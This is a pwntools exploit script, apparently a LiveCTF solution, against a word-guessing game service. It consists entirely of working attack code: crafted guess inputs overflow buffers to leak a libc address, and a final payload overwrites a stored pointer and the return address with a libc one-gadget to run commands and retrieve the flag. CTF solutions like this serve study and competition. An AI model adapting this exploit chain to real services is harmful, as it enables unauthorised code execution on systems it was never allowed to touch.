#!/usr/bin/env python3

from pwn import *

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

p = remote(HOST, int(PORT))

p.recvuntil(b"How long will the solution word be?")
p.sendline(b'10')

p.recvuntil(b"How many guesses does the player get?")
p.sendline(b'7')

p.recvuntil(b"What is your guess")
p.send(b"A"*9+p8(0x71))

p.recvuntil(b"What is your guess")
payload = b'A'*9 + p8(0xff)
payload += b'B'*9 + p8(0xe)
payload += b'C'*9 + p8(0xe)
payload += b'D'*9 + p8(0xe)
payload = payload.ljust(0x6c, b'Z')
payload += p32(0x6c)
payload += p8(3)
p.send(payload)

res = p.recvuntil(b"What is your guess")
res = res.replace(b"\x1B[0m", b'').replace(b"\x1B[1;30;42m", b'').replace(b"\x1B[1;30;43m", b'').replace(b'\n', b' ').replace(b"  ", b'')
libcbase = u64(res[259:259+8]) - 0x29d90

log.info("libcbase: "+hex(libcbase))

# p.recvuntil(b"What is your guess")
p.send(b"A"*9+p8(0xe) + b'BBBB')

p.recvuntil(b"What is your guess")
payload = b"A"*9+p8(0xff)+b'BBBB'
p.send(payload)

p.recvuntil(b"What is your guess")
payload = b'Z'*0x3a
payload += p32(0x3a)
payload += p32(6)
payload = payload.ljust(0x5a-8, b'Z')
payload += p64(libcbase + 0x220000)
payload += p64(libcbase + 0xebcf1)
payload = payload.ljust(0xff, b'Z')
p.send(payload)

p.sendline(b"./submitter")

flag = p.recvline_contains(b'LiveCTF{').decode().strip()
log.info('Flag: %s', flag)

# p.interactive()